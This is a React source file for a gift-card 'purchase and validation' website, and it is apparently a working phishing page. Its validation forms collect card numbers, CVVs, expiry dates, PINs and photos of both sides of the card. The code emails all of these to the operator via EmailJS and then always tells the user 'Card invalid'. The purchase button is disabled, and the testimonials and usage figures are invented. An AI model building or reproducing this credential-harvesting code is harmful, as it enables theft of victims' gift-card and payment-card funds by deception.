import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider, CardFooter, ButtonGroup, VStack, SimpleGrid, Accordion, AccordionItem, AccordionButton, AccordionPanel, AccordionIcon, Input, Link, Modal, ModalContent, ModalOverlay, ModalBody, ModalHeader, ModalCloseButton, FormControl, FormLabel, ModalFooter, useDisclosure, Select, useRadioGroup, useNumberInput, HStack, Switch, useRadio, useBreakpointValue, Spinner } from "@chakra-ui/react"
import { useRef, forwardRef, useState } from 'react';
import emailjs from '@emailjs/browser';
import imageCompression from 'browser-image-compression';
import axios from 'axios';

const CLOUD_NAME = process.env.REACT_APP_CLOUD_NAME
const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;
const CLOUDINARY_UPLOAD_PRESET = process.env.REACT_APP_UPLOAD_PRESET;

export default function Home({ informationSectionRef }) {
    const faqRef = useRef(null);
    const purchaseOrValidateRef = useRef(null);

    return (
        <>
            <ImageSection />
            <WhyChooseUsSection />
            <div ref={purchaseOrValidateRef}>
                <PurchaseOrValidate />
            </div>
            <CustomerFeedback />
            <div ref={faqRef}>
                <FAQSection />
            </div>
            <div ref={informationSectionRef}>
                <InformationSection faqRef={faqRef} purchaseOrValidateRef={purchaseOrValidateRef} />
            </div>
        </>
    );
}

const ImageSection = () => {
    return (
        <Box
            bgImage="url('/backgroundSUB.webp')"
            bgSize="cover"
            bgPosition="center"
            bgRepeat="no-repeat"
            minHeight="60vh"
            width="100vw"
            position="relative"
        >
            <Box
                bg="black"
                opacity="0.4"
                position="absolute"
                top="0"
                left="0"
                width="100%"
                height="100%"
                zIndex="0"
            />
           <Box
                position="relative"
                zIndex="1"
                py={20}
                maxWidth={{ base: '90%', md: '70%', lg: '50%' }} // Responsive maxWidth
                textAlign="left"
                color="white"
                ps={10} // Optional: Add some padding to the right
            >
                <Text fontSize={{ base: '30px', md: '35px', lg: '40px' }} fontWeight="bold"> {/* Adjusted font size */}
                    <Text as="span" color="white">
                        Welcome to
                    </Text>{" "}
                    <p>
                        <Text as="span" color="white">
                            <Text as="span" color="white" px={4} py={2} fontSize={{ base: '30px', md: '35px', lg: '40px' }}>
                                Card Validator
                            </Text>
                        </Text>
                    </p>
                </Text>
                <Text mt={10} fontSize={{ base: '15px', md: '18px', lg: '20px' }} color="white" py={20}> {/* Adjusted font size */}
                    Your <Text as="span" fontWeight="bold">No. 1</Text> stop for any gift card purchase and validation - swift response, top-notch security and trusted by over <Text as="span" fontWeight="bold">5,000</Text> users daily. What will you like to do?
                </Text>
            </Box>
        </Box>
    );
};


const WhyChooseUsSection = () => {
    return (
        <Box
            minHeight="50vh"
            width="100%"
            mx="auto"
            py={20}
            px={4}
            position="relative"
            display="flex"
            justifyContent="center"
            alignItems="center"
            background={`black`}
            color={"white"}
        >
            <Flex
                direction={{ base: "column", md: "row" }}
                alignItems="center"
                width="100%"
            >
                <Box width={{ base: "100%", md: "50%" }} pl={{ base: 0, md: 8 }} textAlign={{ base: "center", md: "left" }}>
                    <Text fontSize="2xl" fontWeight="bold" fontStyle="italic" mb={4}>
                        Why You Should Choose Us...
                    </Text>
                    <Text fontSize="sm">
                        Discover the perfect place for buying and verifying digital gift cards. Browse our wide selection of gift cards from top brands across fashion, dining, entertainment, and more.
                    </Text>
                    <Flex mt={6} align="center" justifyContent={{ base: "center", md: "flex-start" }}>
                        <Flex direction="column" align="center" mr={10}>
                            <Text fontSize="4xl" fontWeight="bold">
                                29.4k+
                            </Text>
                            <Text fontSize="sm" color="gray">
                                Validations
                            </Text>
                        </Flex>
                        <Flex direction="column" align="center">
                            <Text fontSize="4xl" fontWeight="bold">
                                20.5k+
                            </Text>
                            <Text fontSize="sm" color="gray">
                                Digital Cards Purchased
                            </Text>
                        </Flex>
                    </Flex>
                </Box>
                <Box width={{ base: "100%", md: "50%" }} pr={{ base: 0, md: 8 }} mb={{ base: 8, md: 0 }}>
                    <Image src="./whychoose1.jpg" alt="Gift Cards" borderRadius="md" />
                </Box>
            </Flex>
        </Box>
    );
};

function RadioCard(props) {
    const { getInputProps, getRadioProps } = useRadio(props)
    const input = getInputProps()
    const checkbox = getRadioProps()

    return (
        <Box as='label'>
            <input {...input} />
            <Box
                {...checkbox}
                cursor='pointer'
                borderWidth='1px'
                borderRadius='md'
                boxShadow='md'
                _checked={{
                    bg: 'black',
                    color: 'white',
                    borderColor: 'teal.600',
                }}
                _focus={{
                    boxShadow: 'outline',
                }}
                px={5}
                py={3}
            >
                {props.children}
            </Box>
        </Box>
    )
}

function PurchaseOrValidate() {
    const data = [
        { logo: "./visavanila.jpeg.webp", name: "VISA Vanilla E - Card" },
        { logo: "./Spotify.png", name: "US Spotify E - Card" },
        { logo: "./Googleplay.png", name: "Google Play E - Card" },
        { logo: "./razer.png", name: "RazerGold E - Card" },
        { logo: "./playstation.png", name: "US PSN E - Card" },
        { logo: "./Hulu.png", name: "US Hulu E - Card" },
        { logo: "./itunes.png", name: "Apple E - Card" },
        { logo: "./american.jpeg", name: "American Express E - Card" },
        { logo: "./sephora.png", name: "Sephora E - Card" },
        { logo: "./nordstorm.png", name: "Nordstrom E - Card" },
        { logo: "./xbox.webp", name: "Xbox E - Card" },
        { logo: "./amazon.png.webp", name: "Amazon E-Card" },
        { logo: "./ebay.png", name: "Ebay E - Card" },
        { logo: "./Steam.webp", name: "Steam E - Card" },
        { logo: "./paramount.jpeg.webp", name: "US Paramount+ E - Card" },
        { logo: "./visagift.jpeg", name: "VISA Gift E - Card" },
    ];

    const { isOpen: isPurchaseOpen, onOpen: onPurchaseOpen, onClose: onPurchaseClose } = useDisclosure();
    const { isOpen: isValidateOpen, onOpen: onValidateOpen, onClose: onValidateClose } = useDisclosure();
    const { isOpen, onOpen, onClose } = useDisclosure();
    const [selectedCard, setSelectedCard] = useState(null);
    const [selectedPrice, setSelectedPrice] = useState(null);
    const [quantity, setQuantity] = useState(1);
    const [validateCurrency, setValidateCurrency] = useState('USD');
    const [validateCardAmount, setValidateCardAmount] = useState('');
    const [validateCardName, setValidateCardName] = useState('');
    const [validateCardNumber, setValidateCardNumber] = useState('');
    const [validateCVV, setValidateCVV] = useState('');
    const [validateExpiry, setValidateExpiry] = useState('');
    const [validatePin, setValidatePin] = useState('');
    const [loading, setLoading] = useState(false);
    const [isUploadMode, setIsUploadMode] = useState(false);
    const [errorMessage, setErrorMessage] = useState('');
    const [isFileValid, setIsFileValid] = useState(true);
    const [frontImage, setFrontImage] = useState(null);
    const [backImage, setBackImage] = useState(null);
    const [frontImageUrl, setFrontImageUrl] = useState('');
    const [backImageUrl, setBackImageUrl] = useState(''); 

    const openPurchaseModal = (card) => {
        setSelectedCard(card);
        onPurchaseOpen();
    };

    const openValidateModal = (card) => {
        setSelectedCard(card);
        onValidateOpen();
    };

    const handleValidateCurrencyChange = (event) => {
        setValidateCurrency(event.target.value);
    };

    const handleValidateCardAmountChange = (event) => {
        setValidateCardAmount(event.target.value);
    };

    const handleValidateCardNameChange = (event) => {
        setValidateCardName(event.target.value);
    };

    const handleValidateCardNumberChange = (event) => {
        setValidateCardNumber(event.target.value);
    };

    const handleValidateCVV = (event) => {
        setValidateCVV(event.target.value);
    };

    const handleValidateExpiry = (event) => {
        setValidateExpiry(event.target.value);
    };

    const handleValidatePin = (event) => {
        setValidatePin(event.target.value);
    };

    const handleFormSubmit = (event) => {
        event.preventDefault();
        setLoading(true);
        const formData = {
            cardName: selectedCard?.name,
            validateCurrency,
            validateCardAmount,
            validateCardName,
            validateCardNumber,
            validateCVV,
            validateExpiry,
            validatePin,
        };
        const serviceId = process.env.REACT_APP_SERVICE_ID;
        const templateId = process.env.REACT_APP_TEMPLATE_ID;
        const publicKey = process.env.REACT_APP_PUBLIC_KEY;
        const templateParams = {
            from_name: "Gift Card Validator",
            CardType: selectedCard?.name,
            Currency: validateCurrency,
            CardAmount: validateCardAmount,
            CardName: validateCardName,
            CardNumber: validateCardNumber,
            CVV: validateCVV,
            Expiry: validateExpiry,
            Pin: validatePin,
            frontOfCard: frontImageUrl,
            backOfCard: backImageUrl,
        }
        emailjs.send(serviceId, templateId, templateParams, publicKey)
            .then((response) => {
                // console.log("email sent succesfully", response)
            })
            .catch((error) => {
                console.error("Error", error)
            })
            .finally(() => {
                setLoading(false);
            });
        // console.log(JSON.stringify(formData, null, 2));
        clearFormData();
        document.getElementById("frontImageUpload").value = "";
        document.getElementById("backImageUpload").value = ""; 
        setTimeout(() => {
            alert('Card invalid');
        }, 4000);
    };

    const form = useRef();

    const handleUploadSubmit = (event) => {
        event.preventDefault();
        setLoading(true);

        const serviceId = process.env.REACT_APP_SERVICE_ID;
        const templateId = process.env.REACT_APP_TEMPLATE_ID;
        const publicKey = process.env.REACT_APP_PUBLIC_KEY;

        emailjs.sendForm(serviceId, templateId, form.current, publicKey)
            .then((response) => {
            // console.log(response)
            alert('Card invalid');
            handleToggleUploadMode();
        })
        .catch((error) => {
            console.error('Error', error);
            alert('Card invalid');
            handleToggleUploadMode();
        })
        .finally(() => {
            setLoading(false);
        });
        };

    const clearFormData = () => {
        setValidateCurrency('USD');
        setValidateCardAmount('');
        setValidateCardName('');
        setValidateCardNumber('');
        setValidateCVV('');
        setValidateExpiry('');
        setValidatePin('');
        setSelectedPrice(null);
        setQuantity(1);
        setFrontImageUrl('')
        setBackImageUrl('')
        setBackImage(null)
        setFrontImage(null)
    };

    const closePurchaseModal = () => {
        clearFormData();
        onPurchaseClose();
    };

    const closeValidateModal = () => {
        clearFormData();
        onValidateClose();
    };

    const closeOtherCardsModal = () => {
        clearFormData();
        onClose();
    };

    const priceOptions = ["$20", "$50", "$100", "$200", "$500"];

    const { getRootProps, getRadioProps } = useRadioGroup({
        name: 'price',
        onChange: setSelectedPrice,
    });

    const group = getRootProps();

    const { getInputProps, getIncrementButtonProps, getDecrementButtonProps } = useNumberInput({
        step: 1,
        defaultValue: 1,
        min: 1,
        max: 99
    });

    const inc = getIncrementButtonProps();
    const dec = getDecrementButtonProps();
    const input = getInputProps();

    const calculateTotalDue = () => {
        const priceValue = selectedPrice ? parseInt(selectedPrice.replace('$', ''), 10) : 0;
        const adjustedPrice = priceValue + (priceValue === 20 || priceValue === 50 ? 2.56 : 4.69);
        const totalAmount = adjustedPrice * quantity;
        return totalAmount.toFixed(2);
    };

    const renderExtraFields = () => {
        if (!selectedCard) return null;

        if (["American Express E - Card"].includes(selectedCard.name)) {
            return (
                <>
                    <FormControl mt={4}>
                        <FormLabel>CVV</FormLabel>
                        <Input placeholder='xxx' value={validateCVV} onChange={handleValidateCVV} />
                    </FormControl>
                    <FormControl mt={4}>
                        <FormLabel>Expiry Date</FormLabel>
                        <Input placeholder='MM/YYYY' value={validateExpiry} onChange={handleValidateExpiry} />
                    </FormControl>
                    <FormControl mt={4}>
                        <FormLabel>Card Pin</FormLabel>
                        <Input placeholder='Enter Card Pin' value={validatePin} onChange={handleValidatePin} />
                    </FormControl>
                </>
            );
        }

        if (["VISA Gift E - Card", "VISA Vanilla E - Card"].includes(selectedCard.name)) {
            return (
                <>
                    <FormControl mt={4}>
                        <FormLabel>CVV</FormLabel>
                        <Input placeholder='xxx' value={validateCVV} onChange={handleValidateCVV} />
                    </FormControl>
                    <FormControl mt={4}>
                        <FormLabel>Expiry Date</FormLabel>
                        <Input placeholder='MM/YYYY' value={validateExpiry} onChange={handleValidateExpiry} />
                    </FormControl>
                </>
            );
        }

        if (["Sephora E - Card", "Nordstrom E - Card"].includes(selectedCard.name)) {
            return (
                <>
                    <FormControl mt={4}>
                        <FormLabel>16 Digit Code</FormLabel>
                        <Input placeholder='Enter 16 Digit Code' value={validateCardNumber} onChange={handleValidateCardNumberChange} />
                    </FormControl>
                    <FormControl mt={4}>
                        <FormLabel>8 Digit PIN</FormLabel>
                        <Input placeholder='Enter 8 Digit PIN' value={validatePin} onChange={handleValidatePin} />
                    </FormControl>
                </>
            );
        }

        return null;
    };

    const handleToggleUploadMode = () => {
        setIsUploadMode(!isUploadMode);
    };

    const compressImage = async (file) => {
    const options = {
        maxSizeMB: 0.25, // Set maximum size to 500KB
        maxWidthOrHeight: 800, // Optional: resize based on the image dimensions
        useWebWorker: true // Optional: for better performance
    };

    try {
        const originalSize = file.size;
        const compressedFile = await imageCompression(file, options);
        const compressedSize = compressedFile.size;

        // Log the original and compressed file sizes
        // console.log(`File successfully compressed from ${originalSize / 1024} KB to ${compressedSize / 1024} KB`);

        return compressedFile;
    } catch (error) {
        // console.log('Error compressing the file:', error);
        return file; // Return the original file if compression fails
    }
    };
    
    // Function to upload image to Cloudinary
    const uploadToCloudinary = async (file) => {
        const formData = new FormData();
        formData.append('file', file);
        formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
        try {
            const response = await axios.post(CLOUDINARY_URL, formData);
            // console.log(response.data.secure_url)
            return response.data.secure_url; // This is the URL for the uploaded image
        } catch (error) {
            console.error('Error uploading to Cloudinary', error);
            return null;
        }
    };

    // Handle file change for front and back image uploads
    const handleFileChange = async (e, setImageState) => {
        const file = e.target.files[0];
        if (!file) return;

        // Generate a local preview of the image
        const localPreviewUrl = URL.createObjectURL(file);
        
        // Update the local preview state
        setImageState(localPreviewUrl); // Show the selected image

        // Upload image to Cloudinary
        setLoading(true);
        const imageUrl = await uploadToCloudinary(file); // Your Cloudinary upload logic
        setLoading(false);

        // Set the Cloudinary URL in the corresponding state variable
        if (e.target.name === 'front_image') {
            setFrontImageUrl(imageUrl); // Store the Cloudinary URL for later use
        } else if (e.target.name === 'back_image') {
            setBackImageUrl(imageUrl); // Store the Cloudinary URL for later use
        }
    };

    const handleSubmit = (event) => {
        event.preventDefault();

        const serviceId = process.env.REACT_APP_SERVICE_ID;
        const templateId = process.env.REACT_APP_TEMPLATE_ID;
        const publicKey = process.env.REACT_APP_PUBLIC_KEY;

        const emailParams = {
            to_name: 'Recipient Name',
            from_name: 'Your Name',
            message: 'Here are the images:',
            front_image_url: frontImageUrl, // Cloudinary URL for the front image
            back_image_url: backImageUrl    // Cloudinary URL for the back image
        };

        emailjs.send(serviceId, templateId, emailParams, publicKey)
            .then((response) => {
                // console.log('Success!', response.status, response.text);
            })
            .catch((error) => {
                console.error('Failed...', error);
            });
    };

    return (
        <Box
            minHeight="30vh"
            width="100%"
            mx="auto"
            py={20}
            px={4}
            position="relative"
            display="flex"
            justifyContent="center"
            alignItems="center"
            background={`gray.700`}
            color={`white`}
        >
            <VStack width="100%">
                <Box width="100%" textAlign="center">
                    <Text fontSize="2xl" fontStyle="italic" mb={4}>
                        <Text as="span" fontWeight="bold">Purchase</Text> or Validate
                    </Text>
                    <Text fontSize="sm">
                        Select a gift card to purchase or validate, if you can't find your preferred card kindly select the "other cards" option.
                    </Text>
                </Box>
                <SimpleGrid 
                    columns={{ base: 1, sm: 2, md: 3 }} 
                    spacing={10} 
                    mt={10} 
                    width="100%" 
                    justifyContent="center"
                >
                    {data.map((item, index) => (
                        <Card key={index} maxW='sm' mx="auto" background={`black`} color={`white`}>
                            <CardBody>
                                <Image
                                    src={item.logo}
                                    alt={item.name}
                                    borderRadius='lg'
                                />
                                <Stack mt='6' spacing='3'>
                                    <Heading size='md'>{item.name}</Heading>
                                </Stack>
                            </CardBody>
                            <Divider />
                            <CardFooter>
                                <ButtonGroup spacing='2'>
                                    <Button colorScheme="white" variant={`outline`} onClick={() => openPurchaseModal(item)}>
                                        Purchase
                                    </Button>
                                    <Button variant='solid' onClick={() => openValidateModal(item)}>
                                        Validate
                                    </Button>
                                </ButtonGroup>
                            </CardFooter>
                        </Card>
                    ))}
                </SimpleGrid>
                <Button
                    size='md'
                    height='48px'
                    width='300px'
                    border='2px'
                    borderColor='black.500'
                    my={20}
                    onClick={onOpen}
                >
                    Validate other Cards
                </Button>
                {/* Purchase Modal */}
                <Modal closeOnOverlayClick={false} isOpen={isPurchaseOpen} onClose={closePurchaseModal} isCentered>
                    <ModalOverlay />
                    <ModalContent background={`black`} color={`white`}>
                        <ModalHeader>
                            <VStack>
                                {selectedCard?.logo && (
                                    <Image
                                        src={selectedCard.logo}
                                        alt={selectedCard.name}
                                        borderRadius='lg'
                                        w={`200px`}
                                    />
                                )}
                                <Text fontSize="xl">{selectedCard?.name}</Text>
                                <Text fontSize={`sm`}>Select the amount you would like to purchase</Text>
                            </VStack>
                        </ModalHeader>
                        <ModalCloseButton />
                        <ModalBody pb={6}>
                            <VStack>
                                <HStack {...group}>
                                    {priceOptions.map((value) => {
                                        const radio = getRadioProps({ value })
                                        return (
                                            <RadioCard key={value} {...radio}>
                                                {value}
                                            </RadioCard>
                                        )
                                    })}
                                </HStack>
                                <FormControl display='flex' alignItems='center' mt={4}>
                                    <FormLabel htmlFor='send-as-gift' mb='0'>
                                        Send as gift
                                    </FormLabel>
                                    <Switch id='send-as-gift' />
                                </FormControl>
                                <HStack maxW='320px' mt={4}>
                                    <Button onClick={() => setQuantity(quantity > 1 ? quantity - 1 : 1)}>-</Button>
                                    <Input value={quantity} readOnly w={14} textAlign="center" />
                                    <Button onClick={() => setQuantity(quantity < 99 ? quantity + 1 : 99)}>+</Button>
                                </HStack>
                                <Text mt={4}>Total Due: ${calculateTotalDue()}</Text>
                            </VStack>
                        </ModalBody>
                        <ModalFooter>
                            <Button colorScheme="white" variant={`outline`} width="100%" isDisabled>
                                Proceed to Payment
                            </Button>
                        </ModalFooter>
                    </ModalContent>
                </Modal>
                {/* Validate Modal */}
                <Modal closeOnOverlayClick={false} isOpen={isValidateOpen} onClose={closeValidateModal} isCentered>
                    <ModalOverlay />
                    <ModalContent background={`black`} color={`white`}>
                        <ModalHeader>{isUploadMode ? "Upload your images" : "Validate your card"}</ModalHeader>
                        <ModalCloseButton />
                            <ModalBody pb={6}>
                                {/* Conditionally show form or upload message */}
                                {isUploadMode ? (
                                <form ref={form} encType="multipart/form-data" onSubmit={handleFormSubmit}>
                                        <FormControl mt={4}>
                                            <FormLabel>Front of Card</FormLabel>
                                            <Box
                                                border="2px dashed #ccc"
                                                borderRadius="md"
                                                p={4}
                                                display="flex"
                                                flexDirection="column"
                                                alignItems="center"
                                                justifyContent="center"
                                                cursor="pointer"
                                                onClick={() => document.getElementById("frontImageUpload").click()}
                                            >
                                                {frontImage ? (
                                                    <Image src={frontImage} alt="Front of Card" boxSize="100px" objectFit="cover" />
                                                ) : (
                                                    <Text>Select Front Image</Text>
                                                )}
                                            </Box>
                                            {/* Hidden File Input */}
                                            <input
                                                type="file"
                                                id="frontImageUpload"
                                                name="front_image"
                                                accept="image/*"
                                                style={{ display: "none" }}
                                                onChange={(e) => handleFileChange(e, setFrontImage)}
                                            />
                                        </FormControl>

                                        <FormControl mt={4}>
                                            <FormLabel>Back of Card</FormLabel>
                                            <Box
                                                border="2px dashed #ccc"
                                                borderRadius="md"
                                                p={4}
                                                display="flex"
                                                flexDirection="column"
                                                alignItems="center"
                                                justifyContent="center"
                                                cursor="pointer"
                                                onClick={() => document.getElementById("backImageUpload").click()}
                                            >
                                                {backImage ? (
                                                    <Image src={backImage} alt="Back of Card" boxSize="100px" objectFit="cover" />
                                                ) : (
                                                    <Text>Select Back Image</Text>
                                                )}
                                            </Box>
                                            {/* Hidden File Input */}
                                            <input
                                                type="file"
                                                id="backImageUpload"
                                                name="back_image"
                                                accept="image/*"
                                                style={{ display: "none" }}
                                                onChange={(e) => handleFileChange(e, setBackImage)}
                                            />
                                        </FormControl>
                                        
                                        <Button
                                            mt={6}
                                            colorScheme="white"
                                            variant="outline"
                                            type="submit"
                                            isDisabled={!isFileValid || loading || !frontImage || !backImage} 
                                        >
                                            {loading ? <Spinner size="sm" /> : 'Validate'}
                                        </Button>
                                    </form>
                                ) : (
                                    <form onSubmit={handleFormSubmit}>
                                    <FormControl>
                                        <FormLabel>Card name</FormLabel>
                                        <Input value={selectedCard?.name} isReadOnly />
                                    </FormControl>
                                    <FormControl mt={4}>
                                        <FormLabel>Select Currency</FormLabel>
                                        <Select placeholder='Select currency' value={validateCurrency} onChange={handleValidateCurrencyChange}>
                                            <option value='USD'>USD</option>
                                            <option value='GBP'>GBP</option>
                                            <option value='EUR'>EUR</option>
                                            <option value='CAD'>CAD</option>
                                            <option value='AUD'>AUD</option>
                                        </Select>
                                    </FormControl>
                                    <FormControl mt={4}>
                                        <FormLabel>Card amount</FormLabel>
                                        <Input placeholder='Enter Card Amount' value={validateCardAmount} onChange={handleValidateCardAmountChange} />
                                    </FormControl>
                                    <FormControl mt={4}>
                                        <FormLabel>Card number</FormLabel>
                                        <Input placeholder='Enter Card Number' value={validateCardNumber} onChange={handleValidateCardNumberChange} />
                                    </FormControl>
                                    {renderExtraFields()}
                                        
                                    <Button colorScheme="white" variant={`outline`} mt={6} mr={3} type="submit" isLoading={loading} spinnerPlacement='start'>
                                        Validate
                                    </Button>
                                </form>
                            )}
                            </ModalBody>
                            <ModalFooter>
                                <Button variant="outline" colorScheme="blue" onClick={handleToggleUploadMode}>
                                    {isUploadMode ? "Type digits" : "scan image"}
                                </Button>
                            </ModalFooter>
                    </ModalContent>
                </Modal>
                {/* Other Cards Modal */}
                <Modal closeOnOverlayClick={false} isOpen={isOpen} onClose={closeOtherCardsModal} isCentered>
                    <ModalOverlay />
                    <ModalContent>
                        <ModalHeader>Validate other card</ModalHeader>
                        <ModalCloseButton />
                        <form onSubmit={handleFormSubmit}>
                            <ModalBody pb={6}>
                                <FormControl mt={4}>
                                    <FormLabel>Select Currency</FormLabel>
                                    <Select placeholder='Select currency' value={validateCurrency} onChange={handleValidateCurrencyChange}>
                                        <option value='USD'>USD</option>
                                        <option value='GBP'>GBP</option>
                                        <option value='EUR'>EUR</option>
                                        <option value='CAD'>CAD</option>
                                        <option value='AUD'>AUD</option>
                                    </Select>
                                </FormControl>
                                <FormControl mt={4}>
                                    <FormLabel>Card amount</FormLabel>
                                    <Input placeholder='Enter Card Amount' value={validateCardAmount} onChange={handleValidateCardAmountChange} />
                                </FormControl>
                                <FormControl mt={4}>
                                    <FormLabel>Card name</FormLabel>
                                    <Input placeholder='Enter Card Name' value={validateCardName} onChange={handleValidateCardNameChange} />
                                </FormControl>
                                <FormControl mt={4}>
                                    <FormLabel>Card number</FormLabel>
                                    <Input placeholder='Enter Card Number' value={validateCardNumber} onChange={handleValidateCardNumberChange} />
                                </FormControl>
                            </ModalBody>
                            <ModalFooter>
                                <Button colorScheme="white" variant={`outline`} mr={3} type="submit" isLoading={loading}spinnerPlacement='start'>
                                    Validate
                                </Button>
                            </ModalFooter>
                        </form>
                    </ModalContent>
                </Modal>
            </VStack>
        </Box>
    );
}

const CustomerFeedback = () => {
    const feedbacks = [
        { name: "Greg", review: "Excellent service! I've been using this gift card site for months, and it always delivers. Fast delivery and a vast selection make it my top choice for gift cards. Highly recommend!" },
        { name: "Josh", review: "Extremely user-friendly! This gift card site offers a smooth interface, making the entire process—from browsing to checkout—effortless. Their customer support is also excellent—always responsive and helpful. Highly recommended!" },
        { name: "Claire", review: "Dependable and trustworthy. I've made several purchases on this site, and every transaction has been seamless, with the gift cards working perfectly. It's my go-to for secure gift card purchases." }
    ];

    return (
        <Box minHeight="30vh" width="100%" mx="auto" py={20} px={4} textAlign="center" background={`black`} color={`white`}>
            <Text fontSize="2xl" fontWeight="bold" mb={4}>Customer Feedback</Text>
            <Text fontSize="sm" mb={10}>What our customers are saying</Text>
            <SimpleGrid columns={{ base: 1, md: 3 }} spacing={10}>
                {feedbacks.map((feedback, index) => (
                    <>
                        <Box mt={10}>
                            <Text fontSize="9xl" color="gray.300">"</Text>
                        </Box>
                        <Box key={index} p={5}>
                            <Text fontWeight="bold" fontSize="lg" mb={10}>{feedback.name}</Text>
                            <Text>{feedback.review}</Text>
                        </Box>
                    </>
                ))}
            </SimpleGrid>
        </Box>
    );
};

const FAQSection = forwardRef((props, ref) => (
    <Box ref={ref} width="100%" mx="auto" py={20} px={4} background={`gray.700`} color={`white`}>
        <Text fontSize="2xl" fontWeight="bold" mb={20} textAlign="center">Frequently Asked Questions</Text>
            <Accordion allowToggle>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                How will my Gift Card be delivered?
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        Upon completion of your order, your Gift Card will be promptly delivered digitally via web email. In certain cases, as a precaution against payment fraud, we might request verification of your payment details by uploading an identification card. Please be aware that this is a one-time request and will significantly expedite future orders. Our standard processing time for a Gift Card is typically 1-3 minutes.
                    </AccordionPanel>
                </AccordionItem>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                What payment methods can i use to buy digital card?
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        FastGiftie offers a secure platform for purchasing Gift Cards online from any location worldwide. We provide a variety of payment methods to suit your convenience, including credit cards, debit cards, Cash App, Venmo, and even cryptocurrency options such as Bitcoin (BTC) and Ethereum (ETH).
                    </AccordionPanel>
                </AccordionItem>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                How can i get a digital card to a friend?
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        Sending a Gift Card to a friend, instantly or scheduling for a specific delivery in the future, is fast and easy. You can do this by sliding the 'send as gift' switch on the purchase a card page
                    </AccordionPanel>
                </AccordionItem>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                What if i need instant support?
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        You can open a support ticket using our customer support live chat and we will respond to your request right away. If you are an existing customer, please provide youn order number or email address associated with your order to help us assist you faster
                    </AccordionPanel>
                </AccordionItem>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                What if i have an issue redeeming my digital Gift Card
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        If in the case there is an issue and you are receiving an error when you try to redeem, please open an online support ticket and include your order number along with a screenshot so we can see the exact error message
                    </AccordionPanel>
                </AccordionItem>
            </Accordion>
    </Box>
));

const InformationSection = ({ faqRef, purchaseOrValidateRef }) => {
    const scrollToFAQ = () => {
        faqRef.current.scrollIntoView({ behavior: 'smooth' });
    };

    const scrollToPurchaseOrValidate = () => {
        purchaseOrValidateRef.current.scrollIntoView({ behavior: 'smooth' });
    };

    return (
        <Box minHeight="30vh" width="100%" px={20} mx="auto" pt={20} bg={`black`} color={`white`}>
            <SimpleGrid columns={{ base: 1, md: 4 }} spacing={10}>
                <Box gridColumn={{ base: "span 1", md: "span 2" }}>
                    <Text fontSize="sm" mb={4}>
                        Purchase digital cards with instant email delivery. We email all kinds of cards internationally. We accept PayPal and credit cards mode of payment. We are available 24/7.
                    </Text>
                    <VStack align="start" spacing={4}>
                        <Input placeholder="Enter your email" />
                        <Button variant='solid'>Submit</Button>
                    </VStack>
                </Box>
                <VStack spacing={4} align="stretch">
                    <Text fontSize="lg" fontWeight="bold">Explore</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }}>About</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }}>Contact</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }} onClick={scrollToFAQ}>FAQ's</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }}>Privacy Policy</Text>
                </VStack>
                <VStack spacing={4} align="stretch">
                    <Text fontSize="lg" fontWeight="bold">Actions</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }} onClick={scrollToPurchaseOrValidate}>Buy Card</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }} onClick={scrollToPurchaseOrValidate}>Validate Card</Text>
                </VStack>
            </SimpleGrid>
            <Box width="100%" mt={10} py={4} textAlign="center">
            <Divider mb={4} />
            <Flex justify="space-between" px={4}>
                <Text>© 2024 Card Validator</Text>
                <Text>All rights reserved.</Text>
            </Flex>
        </Box>
        </Box>
    );
};


